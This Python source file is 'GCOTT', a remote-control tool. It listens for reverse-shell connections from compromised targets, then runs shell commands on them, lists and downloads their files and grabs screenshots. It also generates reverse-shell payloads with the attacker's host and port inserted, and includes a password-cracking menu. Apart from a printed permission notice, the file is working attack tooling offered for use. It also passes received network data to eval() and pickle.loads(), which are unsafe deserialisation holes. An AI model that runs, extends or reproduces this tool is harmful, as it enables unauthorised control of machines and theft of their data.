import os
import gzip
import socket
import pickle

from termcolor import colored
from password import PasswordCracker


class GCOTT:
    def __init__(self):
        self.target = None
        self.target_connection = None
        self.target_ip = None
        self.target_port = None
        self.host_ip = None
        self.host_port = 5555
        self.ss_num = 0
        self.clear()
        self.print_banner()

    def print_banner(self):
        ascii_art = """
  .oooooo.      .oooooo.     .oooooo.   ooooooooooooo ooooooooooooo 
 d8P'  `Y8b    d8P'  `Y8b   d8P'  `Y8b  8'   888   `8 8'   888   `8 
888           888          888      888      888           888      
888           888          888      888      888           888      
888     ooooo 888          888      888      888           888      
`88.    .88'  `88b    ooo  `88b    d88'      888           888      
 `Y8bood8P'    `Y8bood8P'   `Y8bood8P'      o888o         o888o     

"""
        print(ascii_art)
        print('Welcome To GCOTT')
        print('This tool is for taking control of the target')
        print('PLEASE USE THIS TOOL IF ONLY YOU HAVE PERMISSION!')
        print('You can see option with help or -h')

    def clear(self):
        cmd_ = "cls" if os.name == "nt" else "clear"
        os.system(cmd_)

    def display_help(self):
        print('help: Show all option that you can use')
        print('show: Show all settings of connection')
        print('generate: Show generating payload menu')
        print('set [OPTION_NAME]: set the option of connection')
        print('listen: Show listening option')
        print('clear: Clear the screen')
        print('run: Execute')
        print('quit: Quit')

    def display_listen_help(self):
        print('info: get information about target')
        print('cwd: get current directory')
        print('ls: list directory')
        print('cd: change directory')
        print('EX: cd ../ cd [directory_name]')
        print('user: show user permission')
        print('get [File_Name]: get the file from target')

    def display_payload_help(self):
        print('-l: List to All Payloads')
        print('set [Payload_Name]/[Payload_Option]: set the payload(Ex. set reverseShell.py set host_ip 1.1.1.1)')
        print('show: shows the payload options(eg: ip,port)')
        print('-g/generate: generates payload with options')
        print('-q/quit: quit the payload menu')

    def listen(self, ip, port):
        self.target_connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.target_connection.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.target_connection.bind((ip, port))
        self.target_connection.listen()
        print("Listening...")
        self.target, (self.target_ip, self.target_port) = self.target_connection.accept()
        print(self.target_ip, self.target_port)
        return self.target, self.target_connection

    def receive(self):
        try:
            return self.target.recv(1024).decode()
        except (ConnectionResetError, BrokenPipeError):
            print(colored("\n[!] Connection lost with the target.", "red"))
            self.close_connection()
            return None

    def set_payload_file(self, payload_name):
        payloads = os.listdir("payloads")
        full_name = ""
        payload = ""
        for i in payloads:
            if payload_name == i.split(".")[0]:
                payload = i.split(".")[0]
                full_name = i
                break
        try:
            with open(f"payloads/{full_name}", "r") as file:
                edited_payload = file.readlines()
            return payload, full_name, edited_payload
        except FileNotFoundError:
            print(colored(f"[!] Payload '{payload_name}' not found.", "red"))
            return None, None, None

    def set_payload_option(self, option_name, option_value, edited_payload):
        updated_payload = list(edited_payload)  # Create a copy to avoid modifying original during iteration
        if option_name == "ip":
            for i, line in enumerate(updated_payload):
                if "Host_ip =" in line:
                    updated_payload[i] = f'Host_ip = "{option_value}"\n'
        elif option_name == "port":
            for i, line in enumerate(updated_payload):
                if "Host_port =" in line:
                    updated_payload[i] = f'Host_port = {int(option_value)}\n'
        return updated_payload

    def get_file_from_target(self, file_name):
        try:
            with open(file_name, "wb") as file:
                data = b''
                while True:
                    batches = self.target.recv(1024)
                    if batches == b"done":
                        print("done")
                        break
                    if not batches:
                        print(colored("\n[!] Connection interrupted while receiving file.", "red"))
                        break
                    data += batches
                file.write(data)
        except (ConnectionResetError, BrokenPipeError, AttributeError):
            print(colored("\n[!] Error receiving file from target.", "red"))
            self.close_connection()

    def print_directory_list(self, list_dir):
        for item in list_dir:
            if "." in item:
                name, ext = item.split(".")
                if ext == "py":
                    python_sign = colored("Python", "green")
                    print(python_sign, " => ", name)
            else:
                print(item)

    def handle_listen_mode(self):
        self.host_ip = socket.gethostbyname(socket.gethostname())
        print("\nListening Mode Activate on ", self.host_ip, ":", self.host_port)
        print("You can change the host ip and port with set option and then execute\n")
        listen_sign = colored("Listen", "red")
        while True:
            option = input(f"GCOTT@{listen_sign} -> ")
            if option == "show":
                print("\n--------------------------\nHost_IP: ", self.host_ip,
                      "\n--------------------------\nHost_Port: ",
                      self.host_port, "\n--------------------------\n")
            elif "set" in option:
                try:
                    set_option = option.split(" ")[1].split("_")[1].lower()
                    set_value = option.split(" ")[2]
                    if set_option == "ip":
                        self.host_ip = set_value
                    elif set_option == "port":
                        self.host_port = int(set_value)
                except IndexError:
                    print(colored("[!] Invalid set command. Use: set option_name value", "yellow"))
                except ValueError:
                    print(colored("[!] Invalid port value. Please enter a number.", "yellow"))
            elif option == "execute" or option == "run":
                self.target, self.target_connection = self.listen(self.host_ip, self.host_port)
                if not self.target:
                    break
                target_ip_colored = colored(self.target_ip, "red")
                while self.target:
                    command = input(f"{target_ip_colored}@{colored('GCOTT', 'green')}-> ")
                    if command == "help" or command == "-h":
                        self.display_listen_help()
                        continue
                    elif not command:
                        break
                    try:
                        self.target.send(command.encode())
                        if command == "info":
                            info_raw = self.target.recv(1024).decode()
                            if info_raw:
                                info = info_raw.split("(")[1].split(")")[0].split(",")
                                print(info[0].strip(), "\n", info[1].strip(), "\n", info[2].strip(), "\n",
                                      info[3].strip(), "\n", info[4].strip(), "\n")
                        elif command == "cwd":
                            print(self.receive())
                        elif "cd" in command:
                            response = self.receive()
                            if response == "0":
                                print(colored("Permission Denied!!!!!!!!", "red"))
                        elif command == "ls":
                            try:
                                list_dir_raw = self.target.recv(10240).decode()
                                if list_dir_raw:
                                    list_dir = eval(list_dir_raw)
                                    self.print_directory_list(list_dir)
                            except:
                                print(colored("[!] Error listing directory or directory too large.", "yellow"))
                        elif command == "user":
                            print(self.receive())
                        elif command.split(" ")[0] == "get":
                            try:
                                file_name = command.split("get ")[1]
                                self.get_file_from_target(file_name)
                            except IndexError:
                                print(colored("[!] Please specify a file name to get.", "yellow"))
                        elif command == "screenshot":
                            self.get_file_from_target(f"screenshot{self.ss_num}.png")
                            self.ss_num += 1
                        elif command == "shell":
                            while self.target:
                                shell_command = input(f"{target_ip_colored}@{colored('Shell', 'cyan')}: ")
                                if shell_command == "quit":
                                    self.target.send(shell_command.encode())
                                    break
                                elif shell_command:
                                    self.target.send(shell_command.encode())
                                    output_raw = self.target.recv(4096)
                                    if not output_raw:
                                        break
                                    try:
                                        decompressed_data = gzip.decompress(output_raw)
                                        original_data = pickle.loads(decompressed_data)
                                        if shell_command == "di2r" and isinstance(original_data, str):
                                            print("\n".join(original_data.split("\\r\\n")))
                                        else:
                                            print(original_data)
                                    except Exception as e:
                                        print(colored(f"[!] Error processing shell output: {e}", "yellow"))
                                else:
                                    break
                        elif command == "q" or command == "quit":
                            self.close_connection()
                            break
                    except (ConnectionResetError, BrokenPipeError, AttributeError):
                        print(colored("\n[!] Connection with target lost.", "red"))
                        self.close_connection()
                        break
            elif option == "q" or option == "quit":
                break

    def handle_password_cracker(self):
        hashed_password = input("Enter the hashed password: ")
        password_list_path = input("Enter the password list path: ")
        hash_type = input("Enter the hash type: ")
        randomness = input("Enter the randomness type(0/1): ")
        cracker = PasswordCracker(hashed_password, password_list_path, hash_type, randomness)
        result = cracker.crack()
        print("Password => ", result)

    def handle_payload_generator(self):
        payload_sign = colored("Payload", "red")
        host_ip = ""
        host_port = 5555
        edited_payload = []
        payload_name = None

        while True:
            user_input = input(f"GCOTT@{payload_sign} -> ")
            if user_input == "help" or user_input == "-h":
                self.display_payload_help()
            elif user_input == "quit" or user_input == "q":
                break
            elif user_input == "list" or user_input == "-l":
                print("\nPayloads:")
                payloads = os.listdir("payloads")
                self.print_directory_list(payloads)
                print("\n")
            elif "set" in user_input:
                try:
                    payload_name = user_input.split(" ")[1]
                    payload, full_name, edited_payload = self.set_payload_file(payload_name)
                    if payload:
                        payload_name_sign = colored(payload_name, "red")
                        while True:
                            payload_input = input(f"GCOTT@{payload_name_sign} -> ")
                            if payload_input == "show":
                                print("\n--------------------------\nPayload Name: ", payload_name,
                                      "\n--------------------------\nPayload Options: \n")
                                print("Host_ip: ", host_ip, "\n--------------------------\nHost_port: ", host_port,
                                      "\n--------------------------\n")
                            elif "set" in payload_input:
                                try:
                                    option_name = payload_input.split(" ")[1].split("_")[1].lower()
                                    option_value = payload_input.split(" ")[2]
                                    edited_payload = self.set_payload_option(option_name, option_value, edited_payload)
                                    if option_name == "ip":
                                        host_ip = option_value
                                    elif option_name == "port":
                                        host_port = int(option_value)
                                except IndexError:
                                    print(colored("[!] Invalid set command. Use: set option_name value", "yellow"))
                                except ValueError:
                                    print(colored("[!] Invalid port value. Please enter a number.", "yellow"))
                            elif payload_input == "generate" or payload_input == "-g":
                                if payload_name:
                                    try:
                                        with open("payload.py", "w") as file:
                                            file.writelines(edited_payload)
                                        print(colored("Payload Generated as 'payload.py'", "green"))
                                    except Exception as e:
                                        print(colored(f"[!] Error writing payload file: {e}", "red"))
                                else:
                                    print(colored("[!] Please set a payload first.", "yellow"))
                            elif payload_input == "q" or payload_input == "quit":
                                break
                    else:
                        payload_name = None  # Reset if payload not found
                except IndexError:
                    print(colored("[!] Please specify a payload name to set.", "yellow"))

    def close_connection(self):
        if not self.target_connection:
            return
        self.target_connection.close()
        self.target_connection = None
        self.target = None
        print(colored("[*] Connection closed.", "blue"))
        exit(0)

    def run(self):
        while True:
            print(colored("GCOTT$ ", 'red'), end="")
            chapter = input().lower()
            if chapter == "help":
                self.display_help()
            elif chapter == "listen":
                self.handle_listen_mode()
            elif chapter == "password":
                self.handle_password_cracker()
            elif chapter == "generate":
                self.handle_payload_generator()
            elif chapter == "clear":
                self.clear()
            elif chapter == "q" or chapter == "quit":
                print("Quitting...")
                self.close_connection()
                break
            else:
                print("Invalid command!")
                continue


if __name__ == "__main__":
    gcott = GCOTT()
    try:
        gcott.run()
    except KeyboardInterrupt:
        print("Quitting...")
        gcott.close_connection()
        exit(0)
    except EOFError:
        print("Quitting...")
        gcott.close_connection()
        exit(0)
